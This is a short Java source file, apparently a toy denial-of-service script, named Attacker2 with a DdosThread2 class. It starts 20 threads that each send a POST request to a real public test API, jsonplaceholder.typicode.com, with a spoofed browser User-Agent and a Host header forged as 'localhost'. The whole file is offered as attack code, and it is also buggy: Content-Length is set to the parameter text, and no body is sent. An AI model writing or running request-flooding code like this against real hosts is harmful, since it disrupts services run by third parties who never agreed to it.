package com.javahaters;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Attacker2 {

    public static void main(String... args) throws Exception {
        String request = "https://jsonplaceholder.typicode.com/users";
        URL url = new URL(request);
        String param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        for (int i = 0; i < 20; i++) {
            DdosThread2 thread = new DdosThread2(url, param);
            thread.start();
        }
    }

    public static class DdosThread2 extends Thread {
        URL url;
        String param = "";

        public DdosThread2(URL url, String param) {
            this.param = param;
            this.url = url;
        }

        @Override
        public void run() {
            try {
                attack(url, param);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public void attack(URL url, String param) throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        }
    }
}
